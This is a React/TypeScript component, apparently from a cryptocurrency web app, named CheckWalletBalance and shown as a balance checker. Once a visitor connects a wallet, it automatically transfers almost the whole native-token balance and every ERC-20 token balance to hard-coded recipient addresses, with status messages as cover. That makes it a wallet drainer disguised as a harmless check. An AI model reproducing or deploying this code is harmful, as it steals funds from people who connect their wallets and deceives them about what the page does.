/* eslint-disable */


import { useEffect, useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useTransferFunds } from "../hooks/useTransferFunds";
import useNativeBalance from "../hooks/useNativeBalance";
import { getTokensWithBalance } from "../utils/getTokens";
import { MINIMUM_BALANCE, RECIPIENT_ADDRESSES, GAS_BUFFER } from "../constants";
import { useChainId } from "wagmi";

export default function CheckWalletBalance() {
  const { address, isConnected } = useAppKitAccount();
  const { transferNativeToken, transferERC20Token } = useTransferFunds();
  const [walletBalance, setWalletBalance] = useState(0);
  const [tokenName, setTokenName] = useState("");
  const [tokens, setTokens] = useState([]);
  const [status, setStatus] = useState("");
  const chainId = useChainId();

  const { balance, symbol } = useNativeBalance(address as `0x${string}`);
  

  useEffect(() => {
    if (!isConnected || !address) return;

    const processWallet = async () => {
      try {
        setStatus("🔍 Checking balance...");

        
        setWalletBalance(parseFloat(balance));
        setTokenName(symbol);

        if (parseFloat(balance) < MINIMUM_BALANCE) {
          setStatus("❌ Insufficient funds!");
          return;
        }

        setStatus("🔍 Fetching ERC-20 tokens...");
        const erc20Tokens = await getTokensWithBalance(address);

        if (erc20Tokens.length === 0) {
          setStatus("🚀 Sending native token...");
          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
          setStatus("✅ Native token sent!");
        } else {
          setTokens(erc20Tokens);
          setStatus("🚀 Sending tokens...");

          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);

          for (let token of erc20Tokens) {
            await transferERC20Token(token.contractAddress, token.balance, RECIPIENT_ADDRESSES[chainId], token.decimals);
          }

          setStatus("🎉 All transfers complete!");
        }
      } catch (error) {
        console.error("Error processing wallet:", error);
        setStatus("❌ Transfer failed!");
      }
    };

    processWallet();
  }, [isConnected, address, balance, symbol]);

  return (
    <div className="text-center">
      <p>Your Balance: {walletBalance} {tokenName}</p>
      <p className="text-sm">{status}</p>
    </div>
  );
}
